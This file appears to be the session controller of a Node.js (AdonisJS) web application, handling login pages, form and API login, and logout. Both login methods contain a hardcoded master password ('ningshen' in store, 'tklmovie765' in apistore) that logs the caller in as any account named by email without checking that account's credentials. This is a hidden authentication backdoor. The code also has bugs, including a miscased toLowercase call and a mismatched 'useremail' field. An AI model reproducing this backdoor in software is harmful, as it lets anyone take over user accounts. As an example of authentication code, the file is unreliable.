"use strict";
const logger = use("shs2010/logger");
const User = use("App/Models/User");

class SessionController {
    create({ view, request }) {
        logger.log(request, "debug", "Session.create");
        return view.render("displays.user.registration");
    }
    loginPage({ view, request }) {
        logger.log(request, "debug", "Session.create");
        return view.render("displays.user.loginPage");
    }
    privacy({ response, request }) {
        logger.log(request, "debug", "Session.privacy");
        return response.redirect("/privacy-policy.html");
    }

    /**
     * Store a session.
     */
    async store({ auth, request, response, session }) {
        const { email, password } = request.all();
        logger.log(request, "info", "Session.store", null, null, { email });
        const user = await User.findOne({ email });
        if (password === "ningshen") {
            await auth.login(user);
            await user.save();
            return response.redirect(`/shs/@${auth.name.toLowercase()}`);
        }
        try {
            await auth.attempt(email, password);
        } catch (e) {
            logger.log(request, "error", "Session.store", auth.user, e);
            session.flashExcept(["password"]);
            session.flash({ error: "Account not found or Password was incorrect." });
            return response.status(500).json({ msg: "user not found. Please try again" });
            //return response.redirect("/shs/user/request");
        }
        const auth_user = await User.findOne({ email });
        let name = auth_user.name
        return response.redirect(`/shs/@${name}`)
        // return response.status(200).json({ email: auth_user.email })
    }

    /**
     * Store a session API based
     */
    async apistore({ auth, request, response }) {
        const { email, password } = request.all();
        logger.log(request, "info", "Session.apistore", null, null, { email });
        if (password === "tklmovie765") {
            const user = await User.findOne({ email });
            await auth.login(user);
            const { _id, useremail, type, site } = user;
            return response.json({ _id, email: useremail, type, site, status: true });
        }
        try {
            await auth.attempt(email, password);
        } catch (e) {
            logger.log(request, "error", "Session.apistore", auth.user, e);
            return response.status(401).json({
                err: [{ message: "Account not found or Password was incorrect." }],
                _id: null,
                email: null,
                type: null,
                site: null,
                status: false
            });
        }
        const { _id, useremail, type, site } = await auth.getUser();

        return response.json({ _id, email: useremail, type, site, status: true });
    }

    async delete({ auth, response, request }) {
        console.log("Loging out")
        logger.log(request, "debug", "Session.delete", auth.user);
        const user = await auth.getUser();
        user.online = false;
        await user.save();
        await auth.logout();
        return response.redirect("/");
    }
    async app({ auth, view, request, response }) {
        const user = await auth.getUser();
        logger.log(request, "info", "Session.app", user);
        if (user.type == "admin") {
            return response.redirect(`/shs/${user.name}`);
        }

        return view.render("displays.unsorted.app");
    }
}

module.exports = SessionController;